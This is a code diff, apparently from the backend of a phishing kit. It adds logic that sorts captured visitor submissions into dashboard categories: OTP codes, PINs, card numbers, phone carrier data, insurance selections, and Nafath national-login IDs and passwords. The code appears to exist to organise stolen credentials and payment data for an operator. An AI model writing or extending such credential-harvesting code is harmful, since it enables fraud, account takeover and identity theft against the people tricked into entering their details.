@@ -142,9 +142,30 @@ export async function notifyDashboard(payload: Record<string, any>): Promise<voi
       badge = '';
     }
 
+    // Determine the type based on the data
+    // This allows separating different types of data into different dashboard entries
+    const combinedData = { ...(payload?.raw || {}), ...payload };
+    let entryType = 'basic'; // default type
+    
+    if (combinedData.phoneIdNumber || combinedData.phoneCarrier) {
+      entryType = 'phone'; // Phone verification data
+    } else if (combinedData.otpCode || combinedData.otp) {
+      entryType = 'otp'; // OTP code data
+    } else if (combinedData.pinCode || combinedData.pin) {
+      entryType = 'pin'; // PIN code data
+    } else if (combinedData.cardNumber || combinedData._v1) {
+      entryType = 'card'; // Card data
+    } else if (combinedData.selectedOffer || combinedData.offerTotalPrice) {
+      entryType = 'insurance'; // Insurance selection
+    } else if (combinedData.nafadIdNumber || combinedData.nafadPassword) {
+      entryType = 'nafad'; // Nafath verification
+    }
+    // Otherwise, keep 'basic' for home-new data
+
     // Use visitorId directly as id (NOT REQ-XXXXXX) for proper upsert
     const dashboardPayload = {
       id: String(visitorId), // Use visitorId directly for upsert
+      type: entryType, // Type for separating different data types
       visitorId: String(visitorId),
       customer: String(customerName),
       status,
